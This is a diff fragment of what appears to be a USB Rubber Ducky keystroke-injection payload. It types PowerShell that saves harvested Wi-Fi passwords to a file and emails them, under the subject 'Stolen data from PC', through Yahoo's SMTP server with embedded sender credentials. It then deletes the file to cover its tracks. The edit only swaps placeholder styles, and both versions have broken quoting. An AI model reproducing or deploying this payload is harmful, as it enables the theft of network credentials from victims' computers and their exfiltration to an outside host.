@@ -28,7 +28,7 @@ STRING Format-Table -AutoSize
 ENTER
 STRING Out-File -FilePath .\wifi_pass.txt -InputObject $res -Encoding ASCII -Width 50
 ENTER
-STRING Send-MailMessage -To '{{receiver_email}} -from '{{sender_email}}' -Subject "Stolen data from PC" -Body "Exploited data is stored in the attachment." -Attachments .\wifi_pass.txt -SmtpServer 'smtp.mail.yahoo.com' -Credential $(New-Object System.Management.Automation.PSCredential -ArgumentList '{{sender_email}}', $('{{password}}' | ConvertTo-SecureString -AsPlainText -Force)) -UseSsl -Port 587
+STRING Send-MailMessage -To RECEIVER_EMAIL -from SENDER_EMAIL -Subject "Stolen data from PC" -Body "Exploited data is stored in the attachment." -Attachments .\wifi_pass.txt -SmtpServer 'smtp.mail.yahoo.com' -Credential $(New-Object System.Management.Automation.PSCredential -ArgumentList 'SENDER_EMAIL, $(PASSWORD | ConvertTo-SecureString -AsPlainText -Force)) -UseSsl -Port 587
 ENTER
 DELAY 500
 STRING Remove-Item .\wifi_pass.txt
